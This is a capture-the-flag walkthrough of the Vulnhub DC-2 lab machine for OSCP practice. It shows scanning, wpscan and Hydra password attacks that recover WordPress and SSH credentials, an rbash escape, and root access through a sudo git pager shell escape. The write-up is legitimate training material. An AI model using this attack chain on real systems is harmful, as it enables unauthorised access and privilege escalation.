---
title: Write-up DC2 on Vulnhub
author: eMVee
date: 2023-03-26 20:00:00 +0800
categories: [CTF, Vulnhub]
tags: [Vulnhub, OSCP, sudo, git, WordPress]
render_with_liquid: false
---

DC2 another machine from the DC series on Vulnhub. This machine is not listed on the famous TJnull OSCP list, but it is related to several machines on that list. The machine can be downloaded from [Vulnhub](https://www.vulnhub.com/entry/dc-2,311/). After downloading the virtual machine, you have to configure the machine so it is on the same network as your Kali machine.


## Getting started
First create a working directory for this Vulnhub machine. In this case I use some aliases to create and change the working directory in one command.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub]
└─$ mcd DC-2  
```
After creating a working directory, let's check my IP address.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-2]
└─$ myip    

    inet 127.0.0.1
    inet 10.0.2.15

```
Next we should check the IP address of our victim in our virtual network. In this scenario I use arp-scan.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-2]
└─$ sudo arp-scan --localnet        
[sudo] password for emvee: 
Interface: eth0, type: EN10MB, MAC: 08:00:27:e0:29:f9, IPv4: 10.0.2.15
Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:45:23:77       PCS Systemtechnik GmbH
10.0.2.31       08:00:27:41:f5:63       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.8: 256 hosts scanned in 2.115 seconds (121.04 hosts/sec). 4 responded

```
The IP address has been identified and should be assigned to a variable.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-2]
└─$ ip=10.0.2.31
```

## Enumeration
Let's get enumerate more! First we should identify open ports on our target. We can use nmap to do this. In this case I choose for a simple port scan without much details to be quick as possible.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-2]
└─$ nmap -sC -p- $ip -Pn    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-26 19:45 CEST
Nmap scan report for 10.0.2.31
Host is up (0.00082s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
80/tcp   open  http
|_http-title: Did not follow redirect to http://dc-2/
7744/tcp open  raqmon-pdu

Nmap done: 1 IP address (1 host up) scanned in 6.89 seconds
```
There are two open ports on the target. This information should be added to our notes.
- Port 80
    - HTTP
    - redirect to http://dc-2/
- Port 7744
    - raqmon-pdu

Based on those two ports, the HTTP service is the most interesting to check first.
Let's discover some details about this web service with whatweb.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-2]
└─$ whatweb http://$ip     
http://10.0.2.31 [301 Moved Permanently] Apache[2.4.10], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.10 (Debian)], IP[10.0.2.31], RedirectLocation[http://dc-2/]
ERROR Opening: http://dc-2/ - no address for dc-2

```
Again the redirect error is shown. We can add `dc-2` to our `/etc/hosts` file so the redirect will work.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-2]
└─$ sudo nano /etc/hosts 

┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-2]
└─$ cat /etc/hosts      
127.0.0.1       localhost
127.0.1.1       kali
10.0.2.31        dc-2

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```
Now run whatweb again.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-2]
└─$ whatweb http://$ip 
http://10.0.2.31 [301 Moved Permanently] Apache[2.4.10], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.10 (Debian)], IP[10.0.2.31], RedirectLocation[http://dc-2/]
http://dc-2/ [200 OK] Apache[2.4.10], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.10 (Debian)], IP[10.0.2.31], JQuery[1.12.4], MetaGenerator[WordPress 4.7.10], PoweredBy[WordPress], Script[text/javascript], Title[DC-2 &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.7.10]    
```
Well, running whatweb again does result in more information, so let's add them to my notes.
* Linux, probably Debian distro
* Apache 2.4.10
* WordPress 4.7.10

Now let's use Nikto to identify some vulnerabilities and other useful information.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-2]
└─$ nikto -h http://$ip     
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.31
+ Target Hostname:    10.0.2.31
+ Target Port:        80
+ Start Time:         2023-03-26 19:49:41 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Root page / redirects to: http://dc-2/
+ Uncommon header 'link' found, with multiple values: (<http://dc-2/index.php/wp-json/>; rel="https://api.w.org/",<http://dc-2/>; rel=shortlink,)
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login.php: Wordpress login found
+ 7915 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2023-03-26 19:51:05 (GMT2) (84 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```


As already discovered, the website is using a WordPress CMS. The Login page has been identified.
* /wp-login.php

Let's check the website in the browser.

![Image](/assets/img/WriteUp/Vulnhub/DC2/Pasted image 20230326195605.png){: width="700" height="400" }

A menu item `Flag` is shown.

![Image](/assets/img/WriteUp/Vulnhub/DC2/Pasted image 20230326195756.png){: width="700" height="400" }

There is a hint in the first flag for a tool `cewl`. Time to use cewl to create a custom wordlist.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-2]
└─$ cewl http://dc-2 > password.txt

┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-2]
└─$ wc password.txt                         
 239  245 1763 password.txt

```
So, since we got now some passwords generated from the website with cewl, it is time to run wpscan against the target.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-2]
└─$ wpscan --url http://dc-2 -P password.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]
[+] URL: http://dc-2/ [10.0.2.31]
[+] Started: Sun Mar 26 20:16:20 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://dc-2/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
 | Found By: Rss Generator (Passive Detection)
 |  - http://dc-2/index.php/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
 |  - http://dc-2/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://dc-2/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jerry
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Performing password attack on Xmlrpc against 3 user/s
[SUCCESS] - jerry / adipiscing                                                                                                                                                                                                              
[SUCCESS] - tom / parturient                                                                                                                                                                                                                
Trying admin / log Time: 00:01:16 <==============================================================================================                                                                       > (649 / 1127) 57.58%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Mar 26 20:17:45 2023
[+] Requests Done: 802
[+] Cached Requests: 51
[+] Data Sent: 360.477 KB
[+] Data Received: 424.827 KB
[+] Memory used: 254.453 MB
[+] Elapsed time: 00:01:24

```
With wpscan we were able to discover some credentials. Those should be added to our notes as well.
 - Credentials
    - `jerry:adipiscing`
    - `tom:parturient`

Let's try to logon to WordPress with jerry and browse the content in the administration panel.

![Image](/assets/img/WriteUp/Vulnhub/DC2/Pasted image 20230326210429.png){: width="700" height="400" }

This hint tells us that we might be able to logon somewhere else with those credentials.
Let's create a username list and password list before we continue with discovering other services.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-2]
└─$ nano users.txt  

┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-2]
└─$ cat users.txt                  
tom
jerry

┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-2]
└─$ nano passwords.txt

┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-2]
└─$ cat passwords.txt
adipiscing
parturient

```
We did run a quick port scan with nmap and did not discover all ports and services yet.
Let's run nmap again, but this time with a more advanced port scan.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-2]
└─$ sudo nmap -sC -sV -T4 -A -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-26 21:09 CEST
Nmap scan report for dc-2 (10.0.2.31)
Host is up (0.00094s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-generator: WordPress 4.7.10
|_http-title: DC-2 &#8211; Just another WordPress site
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 52517b6e70a4337ad24be10b5a0f9ed7 (DSA)
|   2048 5911d8af38518f41a744b32803809942 (RSA)
|   256 df181d7426cec14f6f2fc12654315191 (ECDSA)
|_  256 d9385f997c0d647e1d46f6e97cc63717 (ED25519)
MAC Address: 08:00:27:41:F5:63 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.94 ms dc-2 (10.0.2.31)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.78 seconds

```
The same ports were detected, but this time we can see `7744` is hosting a SSH service.
We can try to attack this service with Hydra. Our username and password list can be used to attack this service.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-2]
└─$ hydra -L users.txt -P passwords.txt $ip -s 7744 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-26 21:14:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:2/p:2), ~1 try per task
[DATA] attacking ssh://10.0.2.31:7744/
[7744][ssh] host: 10.0.2.31   login: tom   password: parturient
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-26 21:14:17

```
Hydra did identify one valid credential pair to logon to the SSH service.
Let's add this to our notes
- SSH credentials
    - `tom:parturient`


## Initial access
With those new credentials we should try to logon to the SSH service.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-2]
└─$ ssh tom@$ip -p 7744             
The authenticity of host '[10.0.2.31]:7744 ([10.0.2.31]:7744)' can't be established.
ED25519 key fingerprint is SHA256:JEugxeXYqsY0dfaV/hdSQN31Pp0vLi5iGFvQb8cB1YA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.0.2.31]:7744' (ED25519) to the list of known hosts.
tom@10.0.2.31's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
tom@DC-2:~$ 

```
Once we have been connected succesfully we should check who we are and on what system we are working.
```bash
tom@DC-2:~$ whoami;id;hostname
-rbash: whoami: command not found
-rbash: id: command not found
-rbash: hostname: command not found
```
It looks like we are restricted by rbash.
We can try to export the PATH variable just like we have in Kali.

```bash
tom@DC-2:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
```
Now we have to try the commands again to see who we are.
```bash
tom@DC-2:~$ whoami;id;hostname
tom
uid=1001(tom) gid=1001(tom) groups=1001(tom)
DC-2
tom@DC-2:~$ 

```
We are tom on DC-2 and with this user we should try to gain more privileges. Let's see if this user is allowed to run something with the `sudo` command.
```bash
tom@DC-2:~$ sudo -l
[sudo] password for tom: 
Sorry, user tom may not run sudo on DC-2.
```
Tom is not allowed to run anything as sudoer. We should gather more information about our victim machine. First we should gather as much as possible about the Linux operating system, architectur and the kernal.
```bash
tom@DC-2:~$ uname -a
Linux DC-2 3.16.0-4-586 #1 Debian 3.16.51-3 (2017-12-13) i686 GNU/Linux
tom@DC-2:~$ uname -mrs
Linux 3.16.0-4-586 i686
tom@DC-2:~$ cat /proc/version
Linux version 3.16.0-4-586 (debian-kernel@lists.debian.org) (gcc version 4.8.4 (Debian 4.8.4-1) ) #1 Debian 3.16.51-3 (2017-12-13)
tom@DC-2:~$ cat /etc/issue
Debian GNU/Linux 8 \n \l

tom@DC-2:~$ cat /etc/*-release
PRETTY_NAME="Debian GNU/Linux 8 (jessie)"
NAME="Debian GNU/Linux"
VERSION_ID="8"
VERSION="8 (jessie)"
ID=debian
HOME_URL="http://www.debian.org/"
SUPPORT_URL="http://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
tom@DC-2:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 8.11 (jessie)
Release:        8.11
Codename:       jessie
tom@DC-2:~$ 

```
Let's add the following information to our notes: 
 - Debian 8.11
 - Linux 3.16.0-4-586 i686

We did not check in what directory we are currently working and if there are any files in it.

```bash
tom@DC-2:~$ pwd
/home/tom
tom@DC-2:~$ ls
flag3.txt  usr
```
There is a flag in the home directory. We should `cat` the flag, perhaps we get any clue as before.
```bash
tom@DC-2:~$ cat flag3.txt 
Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
```
The flag mentioned omsehting about `su` switching user.

## Privilege escalation
We can try to logon as jerry with the password identified earlier.

```bash
tom@DC-2:~$ su jerry
Password: 
jerry@DC-2:/home/tom$
```
We should change the working directory to the home directory of jerry and capture the flag of this user.
```bash
jerry@DC-2:/home/tom$ cd ~
jerry@DC-2:~$ ls
flag4.txt
jerry@DC-2:~$ cat flag4.txt 
Good to see that you've made it this far - but you're not home yet. 

You still need to get the final flag (the only flag that really counts!!!).  

No hints here - you're on your own now.  :-)

Go on - git outta here!!!!
```
Let's check if this user is allowed to use `sudo`.
```bash
jerry@DC-2:~$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git

```
Well lucky us, [GTFObins](https://gtfobins.github.io/gtfobins/git/#sudo) has git in their list for privilege escalation.
First we should start the git with the default pager, which is likely `less`. This gives us the posibility to gain a root shell.
```bash
jerry@DC-2:~$ sudo git -p help config
GIT-CONFIG(1)                                                                                                 Git Manual                                                                                                 GIT-CONFIG(1)



NAME
       git-config - Get and set repository or global options

SYNOPSIS
       git config [<file-option>] [type] [-z|--null] name [value [value_regex]]
       git config [<file-option>] [type] --add name value
       git config [<file-option>] [type] --replace-all name value [value_regex]
       git config [<file-option>] [type] [-z|--null] --get name [value_regex]
       git config [<file-option>] [type] [-z|--null] --get-all name [value_regex]
       git config [<file-option>] [type] [-z|--null] --get-regexp name_regex [value_regex]
       git config [<file-option>] [type] [-z|--null] --get-urlmatch name URL
       git config [<file-option>] --unset name [value_regex]
       git config [<file-option>] --unset-all name [value_regex]
       git config [<file-option>] --rename-section old_name new_name
       git config [<file-option>] --remove-section name
       git config [<file-option>] [-z|--null] -l | --list
       git config [<file-option>] --get-color name [default]
       git config [<file-option>] --get-colorbool name [stdout-is-tty]
       git config [<file-option>] -e | --edit


DESCRIPTION
       You can query/set/replace/unset options with this command. The name is actually the section and the key separated by a dot, and the value will be escaped.

       Multiple lines can be added to an option by using the --add option. If you want to update or unset an option which can occur on multiple lines, a POSIX regexp value_regex needs to be given. Only the existing values that
       match the regexp are updated or unset. If you want to handle the lines that do not match the regex, just prepend a single exclamation mark in front (see also the section called “EXAMPLES”).

       The type specifier can be either --int or --bool, to make git config ensure that the variable(s) are of the given type and convert the value to the canonical form (simple decimal number for int, a "true" or "false" string
       for bool), or --path, which does some path expansion (see --path below). If no type specifier is passed, no checks or transformations are performed on the value.

       When reading, the values are read from the system, global and repository local configuration files by default, and options --system, --global, --local and --file <filename> can be used to tell the command to read from only
       that location (see the section called “FILES”).

       When writing, the new value is written to the repository local configuration file by default, and options --system, --global, --file <filename> can be used to tell the command to write to that location (you can say --local
       but that is the default).

       This command will fail with non-zero status upon error. Some exit codes are:

        1. The config file is invalid (ret=3),

        2. can not write to the config file (ret=4),

        3. no section or name was provided (ret=2),

        4. the section or key is invalid (ret=1),

        5. you try to unset an option which does not exist (ret=5),

        6. you try to unset/set an option for which multiple lines match (ret=5), or
:

```
Now we should try to spawn a shell.
```bash
:!/bin/sh
# 

```
Let's find out who we are.
```bash
# whoami;id;hostname
root
uid=0(root) gid=0(root) groups=0(root)
DC-2
# cd ~
# pwd
/root
# ls
final-flag.txt
```
Since we are root on the system, we know the flag name we can capture all the information like we should do in the OSCP exam.
Don't forget to make a screenshot during the exam of this information!
```bash
# whoami;id;hostname;ifconfig;cat final-flag.txt
root
uid=0(root) gid=0(root) groups=0(root)
DC-2
eth0      Link encap:Ethernet  HWaddr 08:00:27:41:f5:63  
          inet addr:10.0.2.31  Bcast:10.0.2.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe41:f563/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:147804 errors:0 dropped:0 overruns:0 frame:0
          TX packets:155046 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:13080942 (12.4 MiB)  TX bytes:36910916 (35.2 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:100 errors:0 dropped:0 overruns:0 frame:0
          TX packets:100 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:9949 (9.7 KiB)  TX bytes:9949 (9.7 KiB)

 __    __     _ _       _                    _ 
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ 
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   


Congratulatons!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it's all greatly
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7.

# 

```

